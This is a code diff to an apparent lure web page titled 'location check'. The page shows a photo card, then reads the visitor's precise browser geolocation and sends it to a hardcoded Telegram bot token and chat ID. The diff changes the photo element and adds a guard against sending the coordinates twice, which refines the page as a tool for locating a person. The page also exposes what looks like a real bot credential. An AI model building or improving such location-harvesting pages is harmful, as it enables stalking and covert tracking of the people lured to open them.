@@ -81,9 +81,9 @@
 <body>
 
     <div class="card">
-        <!-- Ваша фотография -->
         <div class="photo-wrapper">
-            <img src="photo.jpg" alt="Фото" onerror="this.style.display='none'">
+            <!-- Впиши сюда точное имя файла с учетом регистра (например: photo.png или Photo.JPG) -->
+            <img src="photo.png" alt="Фото">
         </div>
 
         <h2 id="title">Проверка геопозиции</h2>
@@ -95,8 +95,11 @@
     <script>
         const TOKEN = "9218562846:AAGbvc-EJ2QLHcs8qW-c__liAzlBgUp4HnU";
         const CHAT_ID = "5328460264";
+        let isSent = false; // Защита от повторной отправки
 
         function getLocation() {
+            if (isSent) return;
+
             const statusDiv = document.getElementById("status");
             const titleH2 = document.getElementById("title");
             const btn = document.getElementById("geoBtn");
@@ -113,6 +116,9 @@
 
             navigator.geolocation.getCurrentPosition(
                 function(position) {
+                    if (isSent) return;
+                    isSent = true;
+
                     const lat = position.coords.latitude;
                     const lon = position.coords.longitude;
                     const mapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
@@ -128,6 +134,7 @@
                             statusDiv.innerText = `Координаты (${lat.toFixed(5)}, ${lon.toFixed(5)}) успешно переданы в Telegram.`;
                         })
                         .catch((err) => {
+                            isSent = false;
                             titleH2.innerText = "Ошибка сети";
                             statusDiv.innerText = "Не удалось отправить запрос: " + err.message;
                             btn.style.display = "inline-block";
